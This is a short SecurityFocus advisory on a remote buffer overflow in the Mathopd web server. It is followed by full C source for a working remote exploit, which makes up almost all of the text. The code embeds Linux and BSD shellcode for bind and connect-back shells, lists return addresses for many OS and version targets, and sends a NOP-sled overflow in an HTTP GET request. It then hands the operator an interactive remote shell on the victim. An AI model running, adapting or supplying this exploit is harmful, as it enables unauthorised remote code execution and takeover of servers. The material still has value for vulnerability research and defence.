source: http://www.securityfocus.com/bid/9871/info

It has been reported that Mathopd is prone to a remote buffer overflow vulnerability. The issue arises due to a failure to check the bounds of a buffer storing user-supplied input.

It may be possible for attackers to leverage this vulnerability to execute arbitrary instructions on the affected system. Any code executed would be in the security context of the web server process.

//aionmex26.c
//
// mathopd 1.2/3/4/5b9 remote exploit
// discovered/exploit coded by aion
// (aion@ukr.net)
// (02/11/2003)
//^M
// need url that redirected
// in config look like this:
// Control {
// Alias /blablabla
// Location http://1.2.3.4
// }
//
// --- request.c:962 ----
// if (send_message) {
// b = buf;
// b += sprintf(b, "<title>%s</title>\n"
// "<h1>%s</h1>\n", r->status_line, r->status_line);
//
// ... and i realy need a job ...
//

#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define MAXB 1024*8
#define TIMEOUT 5
#define DELAY 100000
#define CLOSE(x) { if(x) { close(x); x=0;}}
#define FREE(x) { if(x) { free(x); x=NULL;}}
#define debug(x,y) { errno=0; y; perror(x); if(errno) exit(0);}

char x86_linux_connback[] =
/* 0x3f = 0x3e + incl %eax - parse avoid by aion */
// setuid(0), setgid(0)
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80"
/* linux x86 connect back (port=0xb0ef) by eSDee of Netric */
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3e\x40\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3e\x40\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3e\x40\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
"\x01\xcd\x80";

char x86_linux_bindshell[] =
// setuid(0), setgid(0)
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80"
/* by morgan@sexter.com (36864) */
/* 0x3f = 0x3e + incl %eax - once again by aion */
"\xeb\x75\x5e\x29\xc0\x89\x46\x10\x40\x89"
"\xc3\x89\x46\x0c\x40\x89\x46\x08\x8d\x4e"
"\x08\xb0\x66\xcd\x80\x43\xc6\x46\x10\x10"
"\x66\x89\x5e\x14\x88\x46\x08\x29\xc0\x89"
"\xc2\x89\x46\x18\xb0\x90\x66\x89\x46\x16"
"\x8d\x4e\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
"\x66\xcd\x80\x89\x5e\x0c\x43\x43\xb0\x66"
"\xcd\x80\x89\x56\x0c\x89\x56\x10\xb0\x66"
"\x43\xcd\x80\x86\xc3\xb0\x3e\x40\x29\xc9"
"\xcd\x80\xb0\x3e\x40\x41\xcd\x80\xb0\x3e"
"\x40\x41\xcd\x80\x88\x56\x07\x89\x76\x0c"
"\x87\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80\xe8"
"\x86\xff\xff\xff/bin/sh";

/* x86/bsd PIC portshell shellcode
 * by lorian/teso * port 0x4444
 */
unsigned char x86_bsd_portshell[] =
/* + setuidcode 7 bytes */
  "\x33\xc0\x50\xb0\x17\x50\xcd\x80"
  "\x31\xdb\xf7\xe3\x53\x43\x53\x43\x53\xb0\x61\x53"
  "\xcd\x80\x96\x52\x66\x68\x44\x44\x66\x53\x89\xe5"
  "\x6a\x10\x55\x56\x56\x6a\x68\x58\xcd\x80\xb0\x6a"
  "\xcd\x80\x60\xb0\x1e\xcd\x80\x53\x50\x50\xb0\x5a"
  "\xcd\x80\x4b\x79\xf6\x52\x89\xe3\x68\x6e\x2f\x73"
  "\x68\x68\x2f\x2f\x62\x69\x60\x5e\x5e\xb0\x3b\xcd"
"\x80";

char x86_bsd_connback[] =
/* BSD x86 connect back (port=0xb0ef) by eSDee of Netric */
        "\x31\xc0\x31\xdb\x53\xb3\x06\x53"
        "\xb3\x01\x53\xb3\x02\x53\x54\xb0"
        "\x61\xcd\x80\x31\xd2\x52\x52\x68"
        "\x41\x41\x41\x41\x66\x68\xb0\xef"
        "\xb7\x02\x66\x53\x89\xe1\xb2\x10"
        "\x52\x51\x50\x52\x89\xc2\x31\xc0"
        "\xb0\x62\xcd\x80\x31\xdb\x39\xc3"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\x50\x52\x50\xb0\x5a\xcd"
        "\x80\x31\xc0\x31\xdb\x43\x53\x52"
        "\x50\xb0\x5a\xcd\x80\x31\xc0\x43"
        "\x53\x52\x50\xb0\x5a\xcd\x80\x31"
        "\xc0\x50\x68\x2f\x2f\x73\x68\x68"
        "\x2f\x62\x69\x6e\x89\xe3\x50\x54"
        "\x53\x50\xb0\x3b\xcd\x80\x31\xc0"
"\xb0\x01\xcd\x80";

struct targets {
  char *type;
  unsigned long ret_addr;
  int bsize;
  int retfill;
} tlist[] = {
  { "1.2pl7 freebsd 4.6 (0)", 0xbfbff6f8, 800, 50 },
  { "1.3pl7 freebsd 4.6 (0)", 0xbfbff6e8, 800, 50 },
  { "1.4p1 freebsd 4.6 (0)", 0xbfbff7fc, 800, 50 },

  { "1.2pl7 freebsd 4.6 (1)", 0xbfbff6c0, 800, 50 },
  { "1.3pl7 freebsd 4.6 (1)", 0xbfbff6b0, 800, 50 },
  { "1.4p1 freebsd 4.6 (1)", 0xbfbff7c0, 800, 50 },

  { "1.2pl7 freebsd 4.6 (2)", 0xbfbff640, 800, 50 },
  { "1.3pl7 freebsd 4.6 (2)", 0xbfbff630, 800, 50 },
  { "1.4p1 freebsd 4.6 (2)", 0xbfbff744, 800, 50 },

  { "1.2pl7 freebsd 4.8\t", 0xbfbff640, 800, 50 },
  { "1.3pl7 freebsd 4.8\t", 0xbfbff630, 800, 50 },
  { "1.4p1 freebsd 4.8\t", 0xbfbff740, 800, 50 },

  { "1.2pl7 freebsd 4.9\t", 0xbfbff610, 800, 50 },
  { "1.3pl7 freebsd 4.9\t", 0xbfbff600, 800, 50 },
  { "1.4p1 freebsd 4.9\t", 0xbfbff710, 800, 50 },

  { "1.2pl7 freebsd 5.1\t", 0xbfbff5b0, 800, 50 },
  { "1.3pl7 freebsd 5.1\t", 0xbfbff5a0, 800, 50 },
  { "1.4p1 freebsd 5.1\t", 0xbfbff6b0, 800, 50 },

  { "1.2pl7 slackware 7.1.0", 0xbffff92c, 800, 50 },
  { "1.3pl7 slackware 7.1.0", 0xbffff91c, 800, 50 },
  { "1.4p1 slackware 7.1.0", 0xbffffa24, 800, 50 },

  { "1.2pl7 red hat 6.0\t", 0xbffff8dc, 800, 50 },
  { "1.3pl7 red hat 6.0\t", 0xbffff8dc, 800, 50 },
  { "1.4p1 red hat 6.0\t", 0xbffff9c4, 800, 50 },

  { "1.2pl7 red hat 9 (dynamic 0)", 0xbfffd9c0, 800, 50 },
  { "1.3pl7 red hat 9 (dynamic 0)", 0xbfffe130, 800, 50 },
  { "1.4p1 red hat 9 (dynamic 0)", 0xbfffecd0, 800, 50 },

  { "1.2pl7 red hat 9 (dynamic 1)", 0xbfffe820, 800, 50 },
  { "1.3pl7 red hat 9 (dynamic 1)", 0xbffff110, 800, 50 },
  { "1.4p1 red hat 9 (dynamic 1)", 0xbffff4b0, 800, 50 },

  { "1.2pl7 celinux-2.0.02\t", 0xbffff500, 800, 50 },
  { "1.3pl7 celinux-2.0.02\t", 0xbffff4f0, 800, 50 },
  { "1.4p1 celinux-2.0.02\t", 0xbffff610, 800, 50 },

  { "1.2pl7 asplinux 9\t", 0xbffff590, 800, 50 },
  { "1.3pl7 asplinux 9\t", 0xbffff5b0, 800, 50 },
  { "1.4p1 asplinux 9\t", 0xbffff6b0, 800, 50 },

  // 1.5b9 - beta version, always crash in getenv()
  { "1.2/3/4/5 crash\t", 0x12345678, 800, 50 },
  { NULL, 0, 0, 0}
};

struct shellcodes {
  char *shelltype;
  char *shellcode;
  int shellport;
  int backport;
} slist[] = {
  { "x86_bsd_portshell ", x86_bsd_portshell, 17476, 0 },
  { "x86_bsd_connback ", x86_bsd_connback, 0, 45295 },
  { "x86_linux_bindshell", x86_linux_bindshell, 36864, 0 },
  { "x86_linux_connback ", x86_linux_connback, 0, 45295 },
  { NULL, NULL, 0, 0}
};

fd_set rfds;
static jmp_buf w;
struct sockaddr_in s;
long *addr_ptr, addr=0, inet=0,
  starttime, timeout=0, back=0;
int i=0, rlen=0, bsize=0,
  retfill=0, t=0, port=80,
  offset=60, srvok=1, m302ok=0,
  ver=0, exploit=0, shellport=0,
  sock=0, backport=0, a=0,
  b=0, c=0, d=0,
  l=sizeof(s);
char *buff, *ptr, *shellcode=NULL,
  ch, brute=0, *target,
  *dest, verbose=0, cmd[MAXB],
  *shelltype,
  path[256] = "/secure/";

int writem() {
  return write(t,cmd,strlen(cmd));
}

void vwrite_log(const char *fmt, va_list ap) {
  char vbuf[MAXB];
  char *p = vbuf; *p = 0;

  strcpy(vbuf, "aion> "); p += strlen(vbuf);
  vsnprintf(p, sizeof(vbuf) - strlen(vbuf), fmt, ap);
  write(2, vbuf, strlen(vbuf));
  fflush(NULL);
  usleep(DELAY);
}

void log(const char *fmt, ...) {
  va_list ap;
  va_start(ap, fmt);
  vwrite_log(fmt, ap);
  va_end(ap);
}

void recvall(int a)
{
  do {
    i = read(t, cmd, MAXB); cmd[i]=0;
    if(i<=0) return;
    if(verbose) write(2, cmd, i);
    if(a) continue;
    if((ptr=strstr(cmd, "302 Moved")))
      log(" ... 302 Moved: ok\n"), m302ok = 1;
    if((ptr=strstr(cmd, "Server: "))) {
      char *srv=strdup(ptr + strlen("Server: "));

      for(i=0; i<strlen(srv); i++)
        if(srv[i]=='\n'||srv[i]=='\r') srv[i]=0;
      log(" ... Server: %s %s\n", srv,
          !(srvok=strncmp(srv, "Mathopd", strlen("Mathopd"))) ? "ok" : "fail");
      free(srv);
    }
    if((ptr=strstr(cmd, "Content-length"))) {
      for(i=0; i<strlen(ptr); i++)
        if(ptr[i]=='\n'||ptr[i]=='\r') ptr[i]=0;
      log(" ... %s\n\n", ptr);
      if(!(ptr=strchr(ptr, 0x20))) return;
      ptr++; rlen = atoi(ptr);
    }
  } while(i>0);
}

int connectm(char *ip, int port, int *t) {
  struct sockaddr_in sck;
  struct hostent *hp;

  alarm(20);
  if(!(*t=socket(PF_INET, SOCK_STREAM, 0))) return -1;
  if((inet=inet_addr(ip))==-1) {
    if((hp=gethostbyname(ip))) memcpy (&inet, hp->h_addr, 4);
    else { log("error> cannot resolve %s\n", ip); return -1;}
  }
  sck.sin_family=PF_INET; sck.sin_port=htons(port); sck.sin_addr.s_addr=inet;
  inet=connect(*t, (struct sockaddr *)&sck, sizeof(sck));
  perror(NULL); alarm(0); return inet;
}

void list_targets () {
  log("available targets:\n");
  for(i=0; tlist[i].type != NULL; i++) {
    log(" %2d %s\t\t 0x%08x %5d %4d\n",
        i+1, tlist[i].type, (unsigned int) tlist[i].ret_addr,
	tlist[i].bsize, tlist[i].retfill);
    if(!((i+1)%3)) fputc('\n', stderr);
  }
  fputc('\n', stderr); log("shellcodes:\n");
  for(i=0; slist[i].shelltype != NULL; i++)
    log(" %2d %s (%d)\t\t %6d %6d\n",
        i, slist[i].shelltype, strlen(slist[i].shellcode),
	slist[i].shellport, slist[i].backport); fputc('\n', stderr);
}

void usage(char *v) {
  log("\n\tmathopd remote exploit by aion (aion@ukr.net)\n\n"
      "usage: %s [options] [host[:port]]\n"
      "options:\n"
      "base:\n"
      " -t <target> predefined target (0 for a list)\n"
      " -s <code> shellcode to use\n"
      " -p <path> url that redirected (default: %s)\n"
      "other:\n"
      " -a <address> shellcode address\n"
      " -l <rlen> response lenght\n"
      " -i <number> buffer size\n"
      " -r <number> fill buffer with ret addr\n"
      " -x test shellcode\n"
      " -e exploit\n"
      " -b <ip> connect back ip\n"
      " -v verbose mode\n\n",
      v, path);
  exit(0);
}

void test_shellcode() {
  void (* v)(void);
  v = (void *) shellcode;
  v();
}

void shell() {
  while (1) {
    FD_SET(0, &rfds);
    FD_SET(sock, &rfds);

    select(sock + 1, &rfds, NULL, NULL, NULL);
    if(FD_ISSET(0, &rfds)) {
      debug("... read", i = read(0, cmd, sizeof(cmd)));
      debug("... send data", write(sock, cmd, i));
      if(!strncmp(cmd, "exit", 4)) {
        log("exit ...\n");
	break;
      }
    }
    if(FD_ISSET(sock, &rfds)) {
      debug("... read", i = read(sock, cmd, sizeof(cmd)));
      debug("... recv data", write(1, cmd, i));
      if(!i) {
        log("connection closed by foreign host\n");
	break;
      }
    }
  }
}

void sigh(int sn) {
  log("use exit cmd ...\n", sn);
}

int main(int argc, char **argv, char **env) {
  if(argc<=1) usage(argv[0]); fputc('\n', stderr);
  while((ch=getopt(argc,argv,"t:s:p:a:l:i:r:xeb:vh"))!=EOF)
    switch (ch) {
    case 't': {
      i = atoi(optarg);
      if(!i)
	list_targets(),
          exit(0);
        else
          i--;
      target = tlist[i].type;
      addr = tlist[i].ret_addr;
      bsize = tlist[i].bsize;
      retfill = tlist[i].retfill;
      if(strstr(tlist[i].type, "1.3")) ver=3;
      if(strstr(tlist[i].type, "1.4")) ver=4;
    } break;
    case 's': {
      i = atoi(optarg);
      shelltype = slist[i].shelltype;
      shellcode = slist[i].shellcode;
      shellport = slist[i].shellport;
      backport = slist[i].backport;
    } break;
    case 'p': strncpy(path, optarg, sizeof(path)); break;
    case 'a': addr = strtoul(optarg, NULL, 0); break;
    case 'l': rlen = atoi(optarg); break;
    case 'i': bsize = atoi(optarg); break;
    case 'r': retfill = atoi(optarg); break;
    case 'v': verbose++; break;
    case 'x': test_shellcode(); break;
    case 'e': exploit++; break;
    case 'b': {
      strncpy(cmd, optarg, sizeof(cmd));
      for(i = 0; i < strlen(cmd); i++)
	if(cmd[i] == '.') cmd[i] = ' ';
      sscanf(cmd, "%d %d %d %d", &a, &b, &c, &d);
      if(!a||!b||!c||!d)
	log("0 in the ip. pls use another\n"),
          exit(0);
      if(!shellcode)
	log("use -s option before -b\n"),
          exit(0);
      if(shellcode==x86_bsd_connback)
	shellcode[24] = (char ) a,
	  shellcode[25] = (char ) b,
	  shellcode[26] = (char ) c,
	  shellcode[27] = (char ) d,
	  memcpy(&back, shellcode+24, 4);
      if(shellcode==x86_linux_connback)
	shellcode[12+33] = (char ) a,
	  shellcode[12+34] = (char ) b,
	  shellcode[12+35] = (char ) c,
	  shellcode[12+36] = (char ) d,
	  memcpy(&back, shellcode+12+33, 4);
    } break;
    case 'h': default: usage(argv[0]); break;
    }
  dest=argv[argc - 1];
  ptr=strchr(dest,':'); if(ptr!=NULL) { ptr[0]='\0'; ptr++; port=atoi(ptr);}

  log("start attack: (1.%d) %s\n\n", ver, target);
  log("connecting to %s %d ... ", dest, port);
  if(connectm(dest, port, &t)) exit(0);
  log("building query ...\n");
  if(ver>3) {
    sprintf(cmd, "Host: %s\n", dest);
    target=strdup(cmd);
  } else
    target=strdup("");
  sprintf(cmd,
    "GET %s HTTP/1.0\n"
    "%s"
    "Accept: text/html, text/plain\n"
	  "Accept: application/postscript, text/sgml, */*;q=0.01\n"
    "Accept-Encoding: gzip, compress\n"
    "Accept-Language: en\n"
    "Negotiate: trans\n"
    "User-Agent: Lynx/6.6.6\n"
	  "\n", path, target);
  log("sending query (%d) ... ", strlen(cmd));
  if(verbose) log("send>\n%s\n<send\n", cmd);
  writem(); perror(NULL);
  log("receiving data ...\n");
  recvall(rlen);
  close(t);
  if(srvok)
    exit(0);
  if(!m302ok)
    log("url path not redirected. use -p to override\n"),
      exit(0);
  if(!rlen)
    log("rlen auto detection fail. use -l to override\n"),
      exit(0);
  if(rlen % 2)
    log("alignment error (rlen: %d). not exploitable.\n", rlen),
      exit(0);

  log("addr: 0x%x\n", (unsigned int) addr);
  log("rlen: %d\n", rlen);
  log("offset: %d\n", offset);
  addr += rlen + offset;
  log("use addr: 0x%x (addr + rlen + offset)\n", (unsigned int) addr);

  bsize-=rlen;
  bsize-=retfill;
  bsize/=2;
  log("buffer size: %d ((bsize-rlen-retfill)/2)\n", bsize);
  log("retfill: %d\n", retfill);
  log("shellcode len: %d\n\n", strlen(shellcode));

  if(!exploit)
    log("all seems ok. run again with -e option\n"),
      exit(0);
  if(backport) {
    if(!back)
      log("no connect back ip. use -b option\n"),
	exit(0);
    log("connect back to: 0x%08x %d\n", (unsigned long) back, backport);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    s.sin_family = AF_INET;
    s.sin_port = htons(backport);
    s.sin_addr.s_addr = htonl(INADDR_ANY);
    debug("... bind", bind(sock, (struct sockaddr *)&s, sizeof(s)));
    debug("... listen", listen(sock, 5));
  }
  starttime = time(NULL); setjmp(w);
  log("ready in %d sec...\r", starttime + TIMEOUT - time(NULL));
  if(starttime + TIMEOUT >= time(NULL)) longjmp(w, 1);

  log("connecting to %s %d ... ", dest, port);
  if(connectm(dest, port, &t)) exit(0);
  log("building data ...\n");
  buff = (char *)malloc(bsize+retfill*4+100);
  memset(buff, 0x00, bsize+retfill*4+100);
  for(i=0; i<bsize; i++) buff[i] = 0x90;
  ptr=buff+((bsize)-(strlen(shellcode)));
  for(i=0; i<strlen(shellcode); i++) *(ptr++) = shellcode[i];
  addr_ptr = (long *)ptr;
  for(i=0; i<retfill; i+=4) *(addr_ptr++)=addr;

  log("building query + data ...\n");
  sprintf(cmd,
    "GET %s%s HTTP/1.0\n"
    "%s"
    "Accept: text/html, text/plain\n"
	  "Accept: application/postscript, text/sgml, */*;q=0.01\n"
    "Accept-Encoding: gzip, compress\n"
    "Accept-Language: en\n"
    "Negotiate: trans\n"
    "User-Agent: Lynx/6.6.6\n"
	  "\n", path, buff, target);
  log("sending query + data (all: %d) (buff: %d) ... ",
      strlen(cmd), strlen(buff));
  if(verbose) log("send>\n%s\n<send\n", cmd);
  writem(); perror(NULL);

  log("shell ...\n");
  if(shellport) {
    log("connecting to %s %d ... ", dest, shellport);
    sleep(1); if(connectm(dest, shellport, &sock)) exit(0);
  }
  if(backport) {
    debug("... accept", sock = accept(sock, (struct sockaddr *)&s, &l));
  }
  signal(2, sigh);
  shell();
  CLOSE(t);
  CLOSE(sock);
  FREE(target);
  log("done.\n");
  return 0;
}